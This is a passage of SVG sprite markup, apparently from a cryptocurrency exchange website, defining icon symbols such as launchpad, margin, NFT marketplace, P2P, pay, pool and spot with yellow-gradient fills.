        <path fill-rule="evenodd" clip-rule="evenodd" d="M20.0107 3.99117L13.5965 3.99117L9.40887 8.1788L4.4652 8.23405L1.64419 11.055L6.23463 15.6459L9.76263 12.1179L11.884 14.2392L8.35585 17.7673L12.9491 22.361L15.7701 19.54L15.8231 14.593L20.0107 10.4054L20.0107 3.99117ZM8.34759 17.7756L6.22627 15.6543L4.107 17.7736L6.22832 19.8949L8.34759 17.7756Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="launchpad-g">
        <g>
          <path d="M15.914 14.5v5L12 23.415l-2.5-2.5 6.414-6.415z" fill="#76808F"></path>
          <path d="M.586 12l4-4h5l-6.5 6.5-2.5-2.5z" fill="#76808F"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M22 2h-3.929a6 6 0 0 0-4.242 1.757L3.086 14.5 9.5 20.914l10.743-10.743A6 6 0 0 0 22 5.93v-3.93zm-6.5 4a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5z" fill="url(#paint0_linear)"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M3.293 19.293l7-7 1.414 1.414-7 7-1.414-1.414z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="12.543" y1="20.914" x2="12.543" y2="2" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="leaderboard-g">
        <path d="M6 5H2V10.4104L6 14.4624V11.6344L4 9.58957V7H6V5Z" fill="#76808F"></path>
        <path d="M11.0001 17V20H6.00012V22H18.0001V20H13.0001V17H11.0001Z" fill="#76808F"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M18.0001 14.4624L22 10.4104V5H18.0001V14.4624ZM20 9.58957L18.0001 11.6343V7H20V9.58957Z" fill="#76808F"></path>
        <path d="M6 2V14.4853L7.75736 16.2426C8.84315 17.3284 10.3431 18 12 18C13.6569 18 15.1569 17.3284 16.2426 16.2426L18 14.4853V2H6Z" fill="url(#paint0_linear_4968_126172)"></path>
        <defs>
          <linearGradient id="paint0_linear_4968_126172" x1="12" y1="18" x2="12" y2="2" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="liquid-swap-g">
        <g>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M12 8a4 4 0 1 1 0 8 4 4 0 0 1 0-8zm0 5.714L10.286 12 12 10.286 13.714 12 12 13.714z" fill="url(#paint0_linear)"></path>
          <path d="M1 11c0-1.38.595-2.595 1.5-3.5C3.405 6.595 4.62 6 6 6v8.5L3.5 17 1 14.5V11z" fill="#76808F"></path>
          <path d="M23 13c0 1.38-.595 2.595-1.5 3.5-.905.905-2.12 1.5-3.5 1.5V9.5L20.5 7 23 9.5V13z" fill="#76808F"></path>
          <path d="M2.464 7.535c.905-.905 2.12-1.5 3.5-1.5h9v-5h-3.93A5 5 0 0 0 7.5 2.5L2.464 7.535z" fill="url(#paint1_linear)"></path>
          <path d="M21.5 16.5c-.905.905-2.12 1.5-3.5 1.5H9v5h3.929a5 5 0 0 0 3.535-1.465L21.5 16.5z" fill="url(#paint2_linear)"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="12" y1="16" x2="12" y2="8" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
            <linearGradient id="paint1_linear" x1="8.714" y1="7.535" x2="8.714" y2="1.035" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
            <linearGradient id="paint2_linear" x1="15.25" y1="16.5" x2="15.25" y2="23" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="list-grid-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M4 4V11H11V4H4ZM13 11V4H20V11H13ZM16.5 20.7426L12.2573 16.5L16.5 12.2574L20.7426 16.5L16.5 20.7426ZM4 13H11V20H4V13Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 60 60" id="live">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M52.6829 7.31707H7.31707V52.6829H52.6829V7.31707ZM0 0V60H60V0H0Z" fill="url(#paint0_linear_191_5623)"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M17.561 14.6342H24.878V45.3659H17.561V14.6342ZM27.8049 21.9512H35.122V38.0488H27.8049V21.9512ZM45.366 26.3414H38.0489V33.6585H45.366V26.3414Z" fill="url(#paint1_linear_191_5623)"></path>
        <defs>
          <linearGradient id="paint0_linear_191_5623" x1="37.3171" y1="47.561" x2="53.8636" y2="3.40909" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint1_linear_191_5623" x1="32.9269" y1="18.2927" x2="24.3599" y2="42.7699" gradientUnits="userSpaceOnUse">
            <stop stop-color="#969FAB"></stop>
            <stop offset="1" stop-color="#76808E"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="lock-close-g">
        <path d="M4 22H20V9H4V22Z" fill="url(#paint0_linear_7_182)"></path>
        <path d="M9 6C9 4.34315 10.3431 3 12 3C13.6569 3 15 4.34315 15 6V9H17V6C17 3.23858 14.7614 1 12 1C9.23858 1 7 3.23858 7 6V9H9V6Z" fill="#76808F"></path>
        <path d="M13 19V12H11V19H13Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_7_182" x1="12" y1="22" x2="12" y2="9" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="margin-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M18.7678 7.01874L5.82854 19.958L4.06077 18.1902L17 5.25098L17.8839 6.13486L18.7678 7.01874Z" fill="currentColor"></path>
        <path d="M12 4H20V12L12 4Z" fill="currentColor"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.5 11C9.433 11 11 9.433 11 7.5C11 5.567 9.433 4 7.5 4C5.567 4 4 5.567 4 7.5C4 9.433 5.567 11 7.5 11ZM7.5 5.96875L5.96875 7.5L7.5 9.03125L9.03125 7.50017L7.5 5.96875Z" fill="currentColor"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M16.5 20C18.433 20 20 18.433 20 16.5C20 14.567 18.433 13 16.5 13C14.567 13 13 14.567 13 16.5C13 18.433 14.567 20 16.5 20ZM16.5 14.9688L14.9688 16.5L16.5 18.0312L18.0312 16.5002L16.5 14.9688Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="margin-g">
        <g>
          <path d="M21 3v8l-3.293-3.293L4.414 21 3 19.586 16.293 6.293 13 3h8z" fill="url(#linerxxxx0)"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M6.5 11a4.5 4.5 0 1 0 0-9 4.5 4.5 0 0 0 0 9zm0-6.5l-2 2 2 2 2-2-2-2z" fill="url(#linerxxxx1)"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M17.5 22a4.5 4.5 0 1 0 0-9 4.5 4.5 0 0 0 0 9zm0-6.5l-2 2 2 2 2-2-2-2z" fill="url(#linerxxxx2)"></path>
          <defs>
            <linearGradient id="linerxxxx0" x1="12" y1="3" x2="12" y2="21" gradientUnits="userSpaceOnUse">
              <stop stop-color="#929AA5"></stop>
              <stop offset="1" stop-color="#76808F"></stop>
            </linearGradient>
            <linearGradient id="linerxxxx1" x1="6.5" y1="11" x2="6.5" y2="2" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
            <linearGradient id="linerxxxx2" x1="17.5" y1="22" x2="17.5" y2="13" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="market-s24">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.5 4H14.5V19H9.5V4ZM3 11H7.5V19H3V11ZM21 9H16.5V19H21V9Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="news-g">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M4.01379 21L20.0005 21C21.1051 21 22.0005 20.1046 22.0005 19V3H6.00048L6.00004 18.8572C6.00004 20.0358 5.11203 20.9921 4.01379 21ZM8.00048 11.0005H13.0005V17.0005H8.00048V11.0005ZM20.0005 11.0005H15.0005V13.0005H20.0005V11.0005ZM15.0005 15.0005H20.0005V17.0005H15.0005V15.0005Z" fill="url(#paint0_linear_7_31)"></path>
        <path d="M18.0004 8.00049L10.0004 8.00049V6.00049H18.0004V8.00049Z" fill="#76808F"></path>
        <path d="M2 18.8572V9.00005L6 9.00005L6 18.8572C6 20.0407 5.10457 21 4 21C2.89543 21 2 20.0407 2 18.8572Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_7_31" x1="16.5004" y1="13.5" x2="16.5004" y2="2" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="nft-marketplace-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M11.979 19.9844L15.979 15.9844L19.979 11.9844L15.979 7.98438L11.9946 4H20V20H4V12.0054L7.97897 15.9844L11.979 19.9844ZM7.97897 7.98438V15.9844H15.979V7.98438H7.97897ZM7.97897 7.98438L11.9633 4H4V11.9633L7.97897 7.98438ZM9.47893 11.9844L11.9789 9.48438L14.4789 11.9844L11.9789 14.4844L9.47893 11.9844Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="nft-marketplace-g">
        <rect width="18" height="18" transform="matrix(1 0 0 -1 3 21)" fill="url(#paint0_linear_108_52)"></rect>
        <path d="M4 12L12 4L20 12L12 20L4 12Z" fill="#76808F"></path>
        <path d="M8 8V16H16V8H8Z" fill="url(#paint1_linear_108_52)"></path>
        <path d="M9.5 12L12 14.5L14.5 12L12 9.5L9.5 12Z" fill="#76808F"></path>
        <path d="M5 16L8 19H5V16Z" fill="#76808F"></path>
        <path d="M5 8L8 5H5V8Z" fill="#76808F"></path>
        <path d="M16 5H19V8L16 5Z" fill="#76808F"></path>
        <path d="M16 19H19V16L16 19Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_108_52" x1="9" y1="0" x2="9" y2="18" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint1_linear_108_52" x1="12" y1="16" x2="12" y2="8" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="otc-g">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M21 3H15L21 9V3ZM3 21H9L3 15V21Z" fill="#76808F"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M12 5C15.866 5 19 8.13401 19 12C19 15.866 15.866 19 12 19C8.13401 19 5 15.866 5 12C5 8.13401 8.13401 5 12 5ZM12 15L9 12L12 9L15 12L12 15Z" fill="url(#paint0_linear_2611_147362)"></path>
        <path d="M15 21H21V15L15 21Z" fill="url(#paint1_linear_2611_147362)"></path>
        <path d="M9 3H3V9L9 3Z" fill="url(#paint2_linear_2611_147362)"></path>
        <defs>
          <linearGradient id="paint0_linear_2611_147362" x1="12" y1="5" x2="12" y2="19" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint1_linear_2611_147362" x1="18" y1="15" x2="18" y2="21" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint2_linear_2611_147362" x1="6" y1="3" x2="6" y2="9" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="p2p-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M15 4H18.5H21V6.5V8.5H18.5V6.5H15V4ZM5.83333 9.99805C4.54467 9.99805 3.5 11.0427 3.5 12.3314V13.998H11.5V12.3314C11.5 11.0427 10.4553 9.99805 9.16667 9.99805H5.83333ZM14.8333 16C13.5447 16 12.5 17.0447 12.5 18.3333V20H20.5V18.3333C20.5 17.0447 19.4553 16 18.1667 16H14.8333ZM9 17.5H5.5V15.5H3V17.5V20H5.5H9V17.5ZM19 12.502C19 13.8827 17.8807 15.002 16.5 15.002C15.1193 15.002 14 13.8827 14 12.502C14 11.1212 15.1193 10.002 16.5 10.002C17.8807 10.002 19 11.1212 19 12.502ZM7.5 9C8.88071 9 10 7.88071 10 6.5C10 5.11929 8.88071 4 7.5 4C6.11929 4 5 5.11929 5 6.5C5 7.88071 6.11929 9 7.5 9Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="p2p-g">
        <g>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M6.5 3a3 3 0 1 1 0 6 3 3 0 0 1 0-6z" fill="url(#paint0_linear)"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M17.5 13a3 3 0 1 0 0-6 3 3 0 0 0 0 6z" fill="#76808F"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M2 13a3 3 0 0 1 3-3h3a3 3 0 0 1 3 3v3H2v-3z" fill="#76808F"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M13 17a3 3 0 0 1 3-3h3a3 3 0 0 1 3 3v3h-9v-3z" fill="url(#paint1_linear)"></path>
          <path d="M13 4V2h9v4h-2V4h-7z" fill="#76808F"></path>
          <path d="M11 22v-2H4v-2H2v4h9z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="6.5" y1="9" x2="6.5" y2="3" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
            <linearGradient id="paint1_linear" x1="17.5" y1="20" x2="17.5" y2="14" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="pay-f">
        <path d="M3 5H21V8H3V5Z" fill="currentColor"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M3 10.5V19H12.5278C11.5777 17.9385 11 16.5367 11 15C11 13.208 11.7856 11.5994 13.0313 10.5H3ZM5 15H9V17H5V15Z" fill="currentColor"></path>
        <path d="M20.9687 10.5C20.9792 10.5092 20.9896 10.5185 21 10.5278V10.5H20.9687Z" fill="currentColor"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M17 19C19.2091 19 21 17.2091 21 15C21 12.7909 19.2091 11 17 11C14.7909 11 13 12.7909 13 15C13 17.2091 14.7909 19 17 19ZM15 15L17 13L19 15L17 17L15 15Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="pay-g">
        <rect x="2" y="4" width="20" height="15" fill="#76808F"></rect>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M18 22C20.7614 22 23 19.7614 23 17C23 14.2386 20.7614 12 18 12C15.2386 12 13 14.2386 13 17C13 19.7614 15.2386 22 18 22ZM18 15L16 17L18 19L20 17L18 15Z" fill="url(#paint0_linear)"></path>
        <path d="M22 10L2 10L2 7L22 7L22 10Z" fill="url(#paint1_linear)"></path>
        <path d="M10 14L4 14L4 12L10 12L10 14Z" fill="url(#paint2_linear)"></path>
        <defs>
          <linearGradient id="paint0_linear" x1="18" y1="22" x2="18" y2="12" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint1_linear" x1="2" y1="10.5" x2="22" y2="10.5" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint2_linear" x1="2" y1="10.5" x2="22" y2="10.5" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="payment-g">
        <g>
          <circle r="10" transform="matrix(1 0 0 -1 12 12)" fill="url(#paint0_linear)"></circle>
          <path d="M13.088 20v-1.782c2.468-.408 3.62-1.949 3.62-3.768 0-1.893-1.244-2.951-3.843-3.545V7.824c.89.204 1.485.612 1.93 1.113l1.69-1.522c-.817-.928-1.912-1.503-3.397-1.67V4h-2.116v1.745c-2.395.278-3.675 1.578-3.675 3.526 0 1.8 1.132 3.026 3.916 3.601v3.341c-1.04-.148-1.912-.65-2.617-1.392l-1.67 1.522c.927 1.021 2.171 1.782 4.046 1.95V20h2.116zM9.858 9.197c0-.724.408-1.225 1.355-1.41v2.747c-.947-.26-1.355-.631-1.355-1.337zm4.288 5.457c0 .706-.409 1.281-1.281 1.522v-2.932c1.058.315 1.28.872 1.28 1.41z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="10" y1="0" x2="10" y2="20" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="piggy-bank-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M12.0135 1C9.30088 1 7.10183 3.19905 7.10183 5.91171C7.10183 6.83267 7.3553 7.69443 7.79628 8.43103C5.55306 9.4109 3.95023 11.5837 3.7896 14.1476H2V15.9337H3.91462C4.26878 17.6501 5.27957 19.1265 6.67276 20.0888L5.02451 21.7371L6.28746 23L8.3573 20.9302C9.023 21.1518 9.73515 21.2719 10.4753 21.2719H15.7789L17.3705 22.8635L18.6334 21.6006L17.2935 20.2606L21.6429 15.9112L21.6429 13.2243H19.7091C19.5089 12.122 19.0149 11.1221 18.311 10.3087L20.7459 7.87386H16.5177C16.7798 7.27288 16.9252 6.60927 16.9252 5.91171C16.9252 3.19905 14.7262 1 12.0135 1ZM8.88791 5.91171C8.88791 4.18547 10.2873 2.78608 12.0135 2.78608C13.7398 2.78608 15.1392 4.18547 15.1392 5.91171C15.1392 7.63795 13.7398 9.03734 12.0135 9.03734C10.2873 9.03734 8.88791 7.63795 8.88791 5.91171ZM10.674 5.91171L12.0135 4.57215L13.3531 5.91171L12.0135 7.25127L10.674 5.91171ZM9.7484 13.2344H14.2787V11.4484H9.7484V13.2344Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="piggy-bank">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M1 14H3.15003C3.4738 15.595 4.30376 17.0062 5.46493 18.0587L6.14248 18.7362L4.37868 20.5L6.5 22.6214L9.12135 20H14.9999L17.5 22.5001L19.6213 20.3787L18.1213 18.8787L23 14V11H20.85C20.6005 9.77089 20.0504 8.65093 19.2798 7.72018L22 5H10.5C6.52588 5 3.2737 8.09098 3.0164 12H1V14ZM18 12C18.5523 12 19 11.5523 19 11C19 10.4477 18.5523 10 18 10C17.4477 10 17 10.4477 17 11C17 11.5523 17.4477 12 18 12Z" fill="#76808E"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M12 11C14.7614 11 17 8.76142 17 6C17 3.23858 14.7614 1 12 1C9.23858 1 7 3.23858 7 6C7 8.76142 9.23858 11 12 11ZM12 8L10 6L12 4L14 6L12 8Z" fill="url(#paint0_linear_9022_83782)"></path>
        <path d="M12 8L10 6L12 4L14 6L12 8Z" fill="#76808E"></path>
        <defs>
          <linearGradient id="paint0_linear_9022_83782" x1="12" y1="11" x2="12" y2="1" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="pool-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M16.2804 5.59659C13.8786 3.65962 10.8238 2.5 7.49805 2.5L13.4375 8.43945L2.9375 18.9395L5.05882 21.0608L15.5588 10.5608L21.498 16.5C21.498 13.1744 20.3385 10.1196 18.4017 7.71793L20.5588 5.56077L18.4375 3.43945L16.2804 5.59659ZM13.998 17H17.998V21H13.998V17ZM4.49805 7L2.99805 8.5L4.49805 10L5.99805 8.5L4.49805 7Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="pool-g">
        <g>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M.586 18L16.293 2.293l1.414 1.414L2 19.414.586 18z" fill="#76808F"></path>
          <path d="M15.607 4.393A14.953 14.953 0 0 0 5 0l15 15c0-4.142-1.679-7.892-4.393-10.607z" fill="url(#paint0_linear)"></path>
          <path d="M12 13l2 2-2 2-2-2 2-2z" fill="#76808F"></path>
          <path d="M22 7l1 1-1 1-1-1 1-1z" fill="#76808F"></path>
          <path d="M15 17h5v5h-5v-5z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="12.5" y1="15" x2="12.5" y2="0" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="recurring-buy-g">
        <circle r="8" transform="matrix(1 0 0 -1 13.2759 12)" fill="url(#paint0_linear_3295_130337)"></circle>
        <path d="M14.2927 18.3996V16.9741C16.2677 16.6474 17.1883 15.4149 17.1883 13.9597C17.1883 12.4451 16.1934 11.5987 14.1145 11.1235V8.65854C14.8273 8.82188 15.3025 9.14856 15.6588 9.54949L17.0101 8.33186C16.3568 7.5894 15.4807 7.12908 14.2927 6.99543V5.59961H13.4463H12.5999V6.99543C10.6844 7.21817 9.65978 8.25761 9.65978 9.81678C9.65978 11.2571 10.5656 12.2372 12.793 12.6975V15.3704C11.9614 15.2516 11.2635 14.8507 10.6992 14.2567L9.36279 15.4743C10.1053 16.291 11.1001 16.8998 12.5999 17.0335V18.3996H14.2927ZM11.709 9.75738C11.709 9.17826 12.0356 8.77733 12.793 8.62884V10.8265C12.0356 10.6186 11.709 10.3217 11.709 9.75738ZM15.1391 14.123C15.1391 14.6873 14.8124 15.1476 14.1145 15.3407V12.9945C14.9609 13.2469 15.1391 13.6924 15.1391 14.123Z" fill="#76808F"></path>
        <path d="M5.27588 12C5.27588 7.58172 8.8576 4 13.2759 4C17.6942 4 21.2759 7.58172 21.2759 12C21.2759 16.4183 17.6942 20 13.2759 20C11.0562 20 9.04919 19.0973 7.59879 17.6365L6.17955 19.0457C7.99004 20.8691 10.5018 22 13.2759 22C18.7987 22 23.2759 17.5228 23.2759 12C23.2759 6.47715 18.7987 2 13.2759 2C7.75303 2 3.27588 6.47715 3.27588 12H0L4.27597 16.276L8.55194 12H5.27588Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_3295_130337" x1="8" y1="0" x2="8" y2="16" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="reponsible-trading-g">
        <path d="M21 17V3H3V17L12 23L21 17Z" fill="url(#paint0_linear)"></path>
        <path d="M12 5C13.933 5 15.5 6.567 15.5 8.5C15.5 10.433 13.933 12 12 12C10.067 12 8.5 10.433 8.5 8.5C8.5 6.567 10.067 5 12 5Z" fill="#76808F"></path>
        <path d="M8.11111 14C6.39289 14 5 15.3929 5 17.1111V18.3333L12 23L19 18.3333V17.1111C19 15.3929 17.6071 14 15.8889 14H14.5L12 16.5L9.5 14H8.11111Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear" x1="12" y1="23" x2="12" y2="3" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="research-g">
        <g>
          <path d="M7.5 2.5l-2 2L4 3l2-2 1.5 1.5z" fill="#76808F"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M12 20a5 5 0 0 1-3.536-8.536l1.243-1.242-1.414-1.414L7.05 10.05A7 7 0 0 0 12 22v-2z" fill="#76808F"></path>
          <path d="M13 20h9v-2h-9v2z" fill="#76808F"></path>
          <path d="M4 20h18v2H4v-2z" fill="#76808F"></path>
          <path d="M16 8l-5 5-7-7 5-5 7 7z" fill="url(#paint0_linear)"></path>
          <path d="M10.585 12.586l5-5L17 9l-5 5-1.414-1.414z" fill="#76808F"></path>
          <path d="M19.035 12.5a2.5 2.5 0 1 0-3.535 3.536 2.5 2.5 0 0 0 3.535-3.536z" fill="url(#paint1_linear)"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="13.5" y1="10.5" x2="6.5" y2="3.5" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
            <linearGradient id="paint1_linear" x1="19.035" y1="16.035" x2="15.5" y2="12.5" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="rules-f">
        <path d="M11 8.2002C11 5.99106 9.20914 4.2002 7 4.2002H3V18.2002H8.16C9.35253 18.2002 10.4033 18.8352 11.0205 19.7998H12.9795C13.5967 18.8352 14.6475 18.2002 15.84 18.2002H21V4.2002H17C14.7909 4.2002 13 5.99106 13 8.2002V16.2002H11V8.2002Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="savings-dual-g">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M16 16C19.3137 16 22 13.3137 22 10C22 6.68629 19.3137 4 16 4C13.913 4 12.0749 5.06551 11 6.6822V13.3178C12.0749 14.9345 13.913 16 16 16Z" fill="#76808F"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M8 4C11.3137 4 14 6.68629 14 10C14 13.3137 11.3137 16 8 16C4.68629 16 2 13.3137 2 10C2 6.68629 4.68629 4 8 4ZM8 12.5L5.5 10L8 7.5L10.5 10L8 12.5Z" fill="url(#paint0_linear)"></path>
        <rect x="2" y="18" width="20" height="2" fill="#76808F"></rect>
        <defs>
          <linearGradient id="paint0_linear" x1="8" y1="16" x2="8" y2="4" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="security-g">
        <path d="M12 23L3 17V3H21V17.1L12 23Z" fill="url(#paint0_linear_7_162)"></path>
        <path d="M8 12L12 8L16 12L12 16L8 12Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_7_162" x1="12" y1="23" x2="12" y2="3" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="spot-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M15.0002 3.5C12.471 3.5 10.3406 5.20717 9.6983 7.53206C13.2833 7.86295 16.1373 10.7169 16.4682 14.3019C18.7931 13.6597 20.5002 11.5292 20.5002 9C20.5002 5.96243 18.0378 3.5 15.0002 3.5ZM14.5 15C14.5 11.9624 12.0376 9.5 9 9.5C5.96243 9.5 3.5 11.9624 3.5 15C3.5 18.0376 5.96243 20.5 9 20.5C12.0376 20.5 14.5 18.0376 14.5 15ZM6.5 15L9 17.5L11.5 15L9 12.5L6.5 15ZM9.00006 4H4.00006V9L9.00006 4ZM20.0001 20H15.0001L20.0001 15V20Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="spot-g">
        <g>
          <path d="M21.5 8.5a6 6 0 1 1-12 0 6 6 0 0 1 12 0z" fill="#76808F"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M8.5 9.5a6 6 0 1 1 0 12 6 6 0 0 1 0-12zm0 8.5L6 15.5 8.5 13l2.5 2.5L8.5 18z" fill="url(#paint0_linear)"></path>
          <path d="M9 3H3v6l6-6z" fill="url(#paint1_linear)"></path>
          <path d="M15 21h6v-6l-6 6z" fill="url(#paint2_linear)"></path>
          <defs>
